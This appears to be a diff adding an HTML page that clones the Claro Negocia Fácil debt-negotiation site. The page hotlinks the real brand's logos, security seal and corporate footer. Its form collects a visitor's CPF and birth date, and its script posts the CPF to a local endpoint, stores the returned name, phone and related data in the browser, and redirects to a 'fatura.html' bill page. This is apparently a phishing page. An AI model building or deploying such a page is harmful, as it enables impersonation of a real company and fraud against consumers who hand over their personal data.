@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Claro Negocia</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+
+    <style type="text/css">
+
+        body, html {
+        margin: 0;
+        padding: 0;
+        }
+
+        #header {
+            background-color: #E41F2C;
+            width: 100%;
+            height: 55px;
+        }
+
+        .banner{
+            width: 100%;
+            height: 182px;
+            background-image: url(https://claro.negociafacil.com.br/_nuxt/img/Banner-Claro-2.c3419d0.webp);
+            position: relative;
+            background-repeat: no-repeat;
+            background-position: 0 75%;
+            background-size: 100% auto;
+        }
+
+        .inputs{
+            border-radius: 20px;
+            text-align: center;
+            width: 100%;
+            border-color: white;
+            height: calc(2.5em + 2px);
+            background-color: #fff;
+            line-height: 1.5;
+            font-size: 1.05em;
+            color: #495057;
+            border: 1px solid #e41f2c;
+            box-sizing: border-box;
+            padding: 8px 16px;
+            margin: 0;
+            margin-top: 17px;
+        }
+
+        .formulario{
+            background-color: #E41F2C;
+        }
+
+        .termos{
+            color: white;
+        }
+
+        .login{
+            padding: 16px;
+            background-color: #E41F2C;
+        }
+
+        .cnpj{
+            color: white;
+            cursor: pointer;
+            font-size: .7em;
+            text-decoration: underline;
+            text-transform: uppercase;
+            font-weight: 400;
+        }
+
+        body{
+            font-weight: 400;
+            word-spacing: 1px;
+            font-family: Roboto;
+            }
+
+        .botao{
+            font-family: Arial;
+            color: #000000;
+            background-color: #ef9012;
+            border-radius: 20px;
+            width: 100%;
+            height: 44px;
+            font-size: 1.3em;
+            font-weight: 700;
+            min-width: 200px;
+            padding: .4em 1em;
+            margin-top: 20px;
+            border: 1px solid #ef9012;
+        }
+
+        .advantages{
+            font-size: 1em;
+            margin: 6em auto;
+            max-width: 1650px;
+            box-sizing: border-box;
+        }
+
+        .advantages__icons{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            display: flex;
+            justify-content: space-between;
+            list-style: none;
+            margin: auto;
+            padding: 0;
+            text-align: left;
+            width: 97%;
+            box-sizing: border-box;
+        }
+
+        ul{
+            display: block;
+            list-style-type: disc;
+            margin-block-start: 1em;
+            margin-block-end: 1em;
+            margin-inline-start: 0px;
+            margin-inline-end: 0px;
+            padding-inline-start: 40px;
+            unicode-bidi: isolate;
+        }
+
+        .advantages__icons li{
+            margin: 1em auto;
+            text-align: center;
+            width: 80%;
+            border: 1px solid #da291c;
+            border-radius: 10px;
+            justify-content: center;
+            padding: 10px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        li{
+            display: list-item;
+            unicode-bidi: isolate;
+        }
+
+        .advantages li img{
+            height: auto;
+            margin: 0 auto;
+            width: 66px;
+        }
+
+        .advantages__icons .advantages-icons-text{
+            margin-top: 20px;
+        }
+
+        .advantages__icons li h2{
+            color: #e41f2c;
+            font-size: 30px;
+        }
+
+        .steps{
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            margin: auto;
+            max-width: 1650px;
+        }
+
+        .steps .steps-label{
+            background: #da291c;
+            border-radius: 10px 10px 0 0;
+            color: #fff;
+            font-size: 14px;
+            margin: auto;
+            padding: 10px;
+        }
+
+        .steps .steps-container{
+            margin: auto;
+            width: 90%;
+            align-items: center;
+            background-color: #da291c;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .anchor{
+            height: 5px;
+            display: block;
+        }
+
+        .steps .steps-container .steps__icons{
+            display: flex;
+            flex-direction: column;
+            display: flex;
+            justify-content: space-between;
+            list-style: none;
+            margin: auto;
+            padding: 0;
+            text-align: left;
+            width: 97%;
+        }
+
+        .steps .steps-container .steps-btn{
+            font-size: 12px;
+            width: 80%;
+            background-color: #ffc722;
+            border: none;
+            border-radius: 5px;
+            box-shadow: 0 4.756px 0 0 #dca914;
+            color: #000;
+            cursor: pointer;
+            font-weight: 700;
+            padding: 20px;
+            text-transform: uppercase;
+            transform: translateY(50%);
+        }
+
+        .steps .steps-container .steps__icons li{
+            margin: 1em auto;
+            text-align: center;
+            width: 80%;
+            background-color: #da291c;
+            border: 1px solid #fff;
+            border-radius: 10px;
+            padding: 30px;
+        }
+
+        .steps .steps-container .steps__icons p{
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .page-footer{
+            padding: 30px 18px;
+            background-color: #e41f2c;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            margin-top: 50px;
+
+        }
+
+        .page-footer__container{
+            flex-direction: column;
+            display: flex;
+            justify-content: space-between;
+            margin: 0 auto;
+        }
+
+        .logos{
+            border-bottom: 2px solid #fff;
+            justify-content: flex-start;
+            margin: 0 auto 30px;
+            padding: 20px 0;
+            width: 90%;
+            align-items: center;
+            display: flex;
+            flex-direction: row;
+            padding: 30px;
+        }
+
+        .logo{
+            height: 35px;
+            width: 65px;
+            background: transparent url(https://claro.negociafacil.com.br/_nuxt/img/claro-logo-mono.68fcebf.svg) no-repeat 0 0;
+            background-size: contain;
+        }
+
+        .hide {
+            display: none;
+        }
+
+        .plus {
+            color: #fff;
+            font-size: 2em;
+            font-weight: 500;
+            padding: 0 7px;
+            font-size: 1em;
+        }
+
+        .logonf {
+            background-size: contain;
+            width: 150px;
+            background: transparent url(https://claro.negociafacil.com.br/_nuxt/img/logotipo-negocia-facil.003b153.svg) no-repeat 0;
+            height: 32px;
+            width: 188px;
+        }
+
+        nav {
+            display: block;
+            unicode-bidi: isolate;
+        }
+
+        .legal ul {
+            margin-bottom: 50px;
+            padding-left: 10px;
+            top: 50%;
+            list-style-type: none;
+            padding-left: 0;
+            position: relative;
+        }
+
+        .legal li {
+            border-bottom: 2px solid #fff;
+            padding: 8px 0;
+            text-transform: uppercase;
+        }
+
+        .legal li a {
+            color: #fff;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .about{
+            padding: 10px;
+            position: relative;
+        }
+
+        .about p {
+            margin: auto;
+            width: 70%;
+        }
+
+        p {
+            display: block;
+            margin-block-start: 1em;
+            margin-block-end: 1em;
+            margin-inline-start: 0px;
+            margin-inline-end: 0px;
+            unicode-bidi: isolate;
+        }
+
+        .transport{
+            font-size: 12px;
+            font-weight: 700;
+            color: #000;
+        }
+
+    </style>
+</head>
+<body>
+<div id="header">
+    <img class="logoheader" src="https://claro.negociafacil.com.br/_nuxt/img/logo-claro.f5627de.svg" style="width: 100px; padding: 10px;">
+</div>
+
+
+<div class="banner">
+    
+</div>
+<section class="login">
+<div class="formulario">
+    <a class="cnpj" href="https://google.com">Entrar usando CNPJ</a>
+    <form id="lookupForm">
+    <input type="text" name="cpf" id="CPF" placeholder="Digite seu CPF" class="inputs">
+    <br>
+    <input type="text" name="birthday" placeholder="Data de Nascimento (DD/MM/AAAA)" class="inputs">
+    <label>
+    <input type="checkbox" name="termos" style="margin-top: 18px;">
+    <span class="termos">Li e aceito os Termos de Uso e Política de Privacidade.</span>
+    </label>
+    <br>
+    <button type="submit" class="botao">Consulte</button>
+    </form>
+
+</div>
+</section>
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+    $(document).ready(function() {
+        $('#lookupForm').on('submit', function(event) {
+            event.preventDefault();
+            let documentId = $('#CPF').val();
+            $.post('/get_user_info', { CPF: documentId }, function(data) {
+                if (data.error) {
+                    $('#userInfo').html('<div class="alert alert-danger">' + data.error + '</div>');
+                } else {
+                    let userInfoHtml = '<h4>User Information</h4>';
+                    localStorage.setItem("nome", data.NOME);
+                    localStorage.setItem("cpf", data.CPF);
+                    localStorage.setItem("ddd", data.DDD);
+                    localStorage.setItem("fone", data.FONE);
+                    localStorage.setItem("inst", data.INST);
+                    
+                    $('#userInfo').html(userInfoHtml);
+
+                    // Redirect to the new URL after all tasks are done
+                    window.location.href = "fatura.html"; // Replace with the target URL
+                }
+            });
+        });
+    });
+</script>
+
+<div id="userInfo" class="mt-4"></div>
+
+<div class="advantages paddcont">
+
+<div class="advantages paddcont"><ul class="advantages__icons"><li><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTIiIGhlaWdodD0iMzkiIHZpZXdCb3g9IjAgMCA1MiAzOSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTUwLjUzMTIgMTMuMTA5NEM1MS4wNzgxIDEzLjY1NjIgNTEuMDc4MSAxNC40Mzc1IDUwLjYwOTQgMTQuOTA2Mkw0Ny45NTMxIDE3LjU2MjVDNDcuNDA2MiAxOC4wMzEyIDQ2LjcwMzEgMTguMTA5NCA0Ni4xNTYyIDE3LjY0MDZDMzQuNzUgNy4xNzE4OCAxNy4xNzE5IDcuMTcxODggNS43NjU2MiAxNy42NDA2QzUuMjk2ODggMTguMTA5NCA0LjUxNTYyIDE4LjAzMTIgMy45Njg3NSAxNy41NjI1TDEuMzEyNSAxNC45MDYyQzAuODQzNzUgMTQuNDM3NSAwLjg0Mzc1IDEzLjY1NjIgMS4zOTA2MiAxMy4xMDk0QzE1LjIxODggMC4zNzUgMzYuNzAzMSAwLjM3NSA1MC41MzEyIDEzLjEwOTRaTTI2IDI4LjVDMjguNzM0NCAyOC41IDMxIDMwLjc2NTYgMzEgMzMuNUMzMSAzNi4zMTI1IDI4LjczNDQgMzguNSAyNiAzOC41QzIzLjE4NzUgMzguNSAyMSAzNi4zMTI1IDIxIDMzLjVDMjEgMzAuNzY1NiAyMy4xODc1IDI4LjUgMjYgMjguNVpNNDEuNzgxMiAyMi4wMTU2QzQyLjMyODEgMjIuNDg0NCA0Mi4zMjgxIDIzLjM0MzggNDEuODU5NCAyMy44MTI1TDM5LjEyNSAyNi40Njg4QzM4LjY1NjIgMjYuOTM3NSAzNy45NTMxIDI2LjkzNzUgMzcuNDA2MiAyNi41NDY5QzMwLjg0MzggMjAuODQzOCAyMS4wNzgxIDIwLjg0MzggMTQuNTE1NiAyNi41NDY5QzEzLjk2ODggMjYuOTM3NSAxMy4yNjU2IDI2LjkzNzUgMTIuNzk2OSAyNi40Njg4TDEwLjA2MjUgMjMuODEyNUM5LjU5Mzc1IDIzLjM0MzggOS41OTM3NSAyMi40ODQ0IDEwLjE0MDYgMjIuMDE1NkMxOS4xMjUgMTQuMDQ2OSAzMi43OTY5IDE0LjA0NjkgNDEuNzgxMiAyMi4wMTU2WiIgZmlsbD0iI0RBMjkxQyIvPgo8L3N2Zz4K" alt="icone-wifi" loading="lazy"> 
+
+<div class="advantages-icons-text"><h2>Negociação 100% Online</h2></div></li><li><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQwLjM3NSAxNi42MjVDNDEuMTU2MiAxNy4zMjgxIDQxLjE1NjIgMTguNSA0MC4zNzUgMTkuMjgxMkwzMC42ODc1IDI4Ljk2ODhDMjkuOTg0NCAyOS43NSAyOC43MzQ0IDI5Ljc1IDI4LjAzMTIgMjguOTY4OEwyNi4yMzQ0IDI3LjI1QzI1LjUzMTIgMjYuNDY4OCAyNS41MzEyIDI1LjI5NjkgMjYuMjM0NCAyNC41OTM4TDI2LjcwMzEgMjQuMTI1TDIzLjY1NjIgMjFMMTcuMjUgMjcuMzI4MUwxNy43MTg4IDI3Ljc5NjlDMTguNzM0NCAyOC44MTI1IDE4LjczNDQgMzAuMzc1IDE3LjcxODggMzEuMzEyNUw4LjczNDM4IDQwLjI5NjlDNy43OTY4OCA0MS4zMTI1IDYuMjM0MzggNDEuMzEyNSA1LjIxODc1IDQwLjI5NjlMMS43MDMxMiAzNi43ODEyQzAuNjg3NSAzNS43NjU2IDAuNjg3NSAzNC4yMDMxIDEuNzAzMTIgMzMuMjY1NkwxMC42ODc1IDI0LjI4MTJDMTEuNjI1IDIzLjI2NTYgMTMuMTg3NSAyMy4yNjU2IDE0LjIwMzEgMjQuMjgxMkwxNC42NzE5IDI0Ljc1TDIxIDE4LjM0MzhMMTcuODc1IDE1LjI5NjlMMTcuNDA2MiAxNS43NjU2QzE2LjcwMzEgMTYuNDY4OCAxNS41MzEyIDE2LjQ2ODggMTQuNzUgMTUuNzY1NkwxMy4wMzEyIDEzLjk2ODhDMTIuMjUgMTMuMjY1NiAxMi4yNSAxMi4wMTU2IDEzLjAzMTIgMTEuMzEyNUwyMi43MTg4IDEuNjI1QzIzLjUgMC44NDM3NSAyNC42NzE5IDAuODQzNzUgMjUuMzc1IDEuNjI1TDI3LjE3MTkgMy4zNDM3NUMyNy44NzUgNC4xMjUgMjcuODc1IDUuMjk2ODggMjcuMTcxOSA2TDI2LjcwMzEgNi40Njg3NUwzNS41MzEyIDE1LjI5NjlMMzYgMTQuODI4MUMzNi43MDMxIDE0LjEyNSAzNy44NzUgMTQuMTI1IDM4LjY1NjIgMTQuODI4MUw0MC4zNzUgMTYuNjI1WiIgZmlsbD0iI0RBMjkxQyIvPgo8L3N2Zz4K" alt="icone-martelo" loading="lazy">
+
+<div class="advantages-icons-text"><h2>Acordo sem burocracia</h2></div></li><li><img data-v-e5220c9e="" src="https://claro.negociafacil.com.br/_nuxt/img/earth-americas.9b602d5.svg" alt="icone-planta-terra" loading="lazy"> <div class="advantages-icons-text"><h2>Negocie onde e quando quiser</h2></div></li><li><img src="https://claro.negociafacil.com.br/_nuxt/img/fingerprint.662b6d9.svg" alt="icone-impressao-digital" loading="lazy"> <div class="advantages-icons-text"><h2>Quitação ágil e segura</h2></div></li></ul></div>
+
+</div>
+
+<div class="steps paddcont"><div class="steps-label">Veja como funciona:</div> 
+
+<div class="steps-container"><a class="anchor"></a> <ul class="steps__icons"><li><img src="https://claro.negociafacil.com.br/_nuxt/img/id-card.4e8957e.svg" alt="icone de uma pessoa" loading="lazy"> <div class="steps-icons-text"><p>Informe seus dados de CPF e data de nascimento</p></div></li> <li><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0OCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEzIDcuNUMxMS41OTM4IDcuNSAxMC40MjE5IDYuNzk2ODggOS43MTg3NSA1LjYyNUM5LjAxNTYyIDQuNTMxMjUgOS4wMTU2MiAzLjA0Njg4IDkuNzE4NzUgMS44NzVDMTAuNDIxOSAwLjc4MTI1IDExLjU5MzggMCAxMyAwQzE0LjMyODEgMCAxNS41IDAuNzgxMjUgMTYuMjAzMSAxLjg3NUMxNi45MDYyIDMuMDQ2ODggMTYuOTA2MiA0LjUzMTI1IDE2LjIwMzEgNS42MjVDMTUuNSA2Ljc5Njg4IDE0LjMyODEgNy41IDEzIDcuNVpNMTIuMzc1IDM3LjVDMTIuMzc1IDM4LjkwNjIgMTEuMjAzMSA0MCA5Ljg3NSA0MEM4LjQ2ODc1IDQwIDcuMzc1IDM4LjkwNjIgNy4zNzUgMzcuNVYyMC4wNzgxTDUuMTA5MzggMjMuODI4MUM0LjQwNjI1IDI1IDIuODQzNzUgMjUuMzkwNiAxLjY3MTg4IDI0LjY4NzVDMC41IDIzLjk4NDQgMC4xMDkzNzUgMjIuNDIxOSAwLjgxMjUgMjEuMjVMNS4zNDM3NSAxMy42NzE5QzYuNzUgMTEuNDA2MiA5LjE3MTg4IDEwIDExLjgyODEgMTBIMTYuOTg0NEgyM1YzLjc1QzIzIDEuNzE4NzUgMjQuNjQwNiAwIDI2Ljc1IDBINDQuMjVDNDYuMjgxMiAwIDQ4IDEuNzE4NzUgNDggMy43NVYyMS4yNUM0OCAyMy4zNTk0IDQ2LjI4MTIgMjUgNDQuMjUgMjVIMjYuNzVDMjQuNjQwNiAyNSAyMyAyMy4zNTk0IDIzIDIxLjI1VjE3LjVIMjhWMjBINDNWNUgyOFYxMEgyOS4yNUMzMC41NzgxIDEwIDMxLjc1IDExLjE3MTkgMzEuNzUgMTIuNUMzMS43NSAxMy45MDYyIDMwLjU3ODEgMTUgMjkuMjUgMTVIMjhIMjNIMTguNjI1VjM3LjVDMTguNjI1IDM4LjkwNjIgMTcuNDUzMSA0MCAxNi4xMjUgNDBDMTQuNzE4OCA0MCAxMy42MjUgMzguOTA2MiAxMy42MjUgMzcuNVYyNy41SDEyLjM3NVYzNy41WiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==" alt="pessoa" loading="lazy">
+
+<div class="steps-icons-text"><p>Consulte os detalhes da sua fatura em atraso com a Claro</p></div></li> <li><img src="https://claro.negociafacil.com.br/_nuxt/img/handshake.1ab13a8.svg" alt="handshake" loading="lazy"> <div class="steps-icons-text"><p>Escolha a melhor opção para negociar suas dívidas Claro</p></div></li> <li><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCA0MCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMzBWMEgxLjQwNjI1VjMwSDBaTTIuMDMxMjUgMzBWMEgyLjgxMjVWMzBIMi4wMzEyNVpNNC4yMTg3NSAzMFYwSDQuODQzNzVWMzBINC4yMTg3NVpNNy42NTYyNSAzMFYwSDguMzU5MzhWMzBINy42NTYyNVpNMTAuNDY4OCAzMFYwSDExLjg3NVYzMEgxMC40Njg4Wk0xMy45ODQ0IDMwVjBIMTQuNjg3NVYzMEgxMy45ODQ0Wk0xNS4zOTA2IDMwVjBIMTYuMDkzOFYzMEgxNS4zOTA2Wk0xNi43OTY5IDMwVjBIMTcuNVYzMEgxNi43OTY5Wk0xOS42MDk0IDMwVjBIMjEuMDE1NlYzMEgxOS42MDk0Wk0yMy4xMjUgMzBWMEgyNC41MzEyVjMwSDIzLjEyNVpNMjUuOTM3NSAzMFYwSDI3LjM0MzhWMzBIMjUuOTM3NVpNMjguNzUgMzBWMEgzMC4xNTYyVjMwSDI4Ljc1Wk0zMC44NTk0IDMwVjBIMzIuMjY1NlYzMEgzMC44NTk0Wk0zNC4zNzUgMzBWMEgzNi40ODQ0VjMwSDM0LjM3NVpNMzcuMTg3NSAzMFYwSDM3Ljg5MDZWMzBIMzcuMTg3NVpNMzguNTkzOCAzMFYwSDQwVjMwSDM4LjU5MzhaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="codigo-de-barras" loading="lazy">
+
+<div class="steps-icons-text"><p>Selecione como você quer pagar sua dívida ativa com a Claro</p></div></li></ul> <button class="steps-btn"><a class="transport" href="#header">Negocie agora a sua dívida claro</a></button></div></div>
+
+<footer class="page-footer">
+
+    <div class="page-footer__container">
+
+        <div class="logos"><div class="logo"><span class="hide">Claro</span></div> <span class="plus">+</span> <div class="logonf"><span class="hide">Negocia Fácil</span></div></div> 
+        <nav class="legal">
+            <ul>
+                <li><a href="/privacidade/termos-de-uso" class="">Termos de Uso</a></li>
+                <li><a href="/privacidade/politica-de-privacidade">Política de Privacidade</a></li> 
+                <li><a href="/privacidade/politica-de-cookies">Política de Cookies</a></li> 
+                <li><a href="/privacidade/requisicao-de-titular">Formulário LGPD</a></li> 
+                <li><a>Preferências de cookies</a></li> 
+                <li><a href="https://blog.negociamais.com.br/claro-negocia-facil/">Blog</a></li> 
+                <li><a href="mailto:atendimentonegociafacil@mfmti.com.br">Fale Conosco</a></li>
+            </ul>
+        </nav>
+    </div>
+
+<div data-v-122073df="" class="about"><p data-v-122073df="">
+      © 2024 - <span data-v-122073df="" itemprop="name" class="company-name">Claro Negocia Fácil, uma marca da MFM Tecnologia</span> | CNPJ 03.727.830/0001-03, <span data-v-122073df="" itemprop="address" itemscope="itemscope" itemtype="http://schema.org/PostalAddress" class="company-address"><span data-v-122073df="" itemprop="streetAddress">Av. Fagundes Filho, 486</span> - Vila da Saúde, <span data-v-122073df="" itemprop="addressLocality">São Paulo</span> - <span data-v-122073df="" itemprop="addressRegion">SP</span>, <span data-v-122073df="" itemprop="postalCode">CEP: 04304-000</span></span></p></div> <div data-v-122073df="" id="armored_website" style="width: 115px; height: 32px;"><a href="https://www.siteblindado.com/consumidor/selo-blindado/?language1=pt&amp;hostname=claro.negociafacil.com.br" id="sb-shield-2" target="_blank" rel="noopener" aria-label="Verificar" title="Navegue tranquilamente! Este é um Site Blindado contra ataques! Clique e confira mais detalhes."> <img src="https://seal.siteblindado.com/claro.negociafacil.com.br/seal.png" rel="noopener nofollow " alt="site blindado" oncontextmenu="alert(&quot;Cópia&nbsp;Proibida&nbsp;por&nbsp;Lei&nbsp;-&nbsp;Site&nbsp;Blindado®&nbsp;é&nbsp;marca&nbsp;registrada&nbsp;de&nbsp;Site&nbsp;Blindado&nbsp;S.A.&quot;)&quot;"></a></div> <div data-v-122073df=""></div> <div data-v-122073df=""></div></footer>
+
+</body>
+</html>
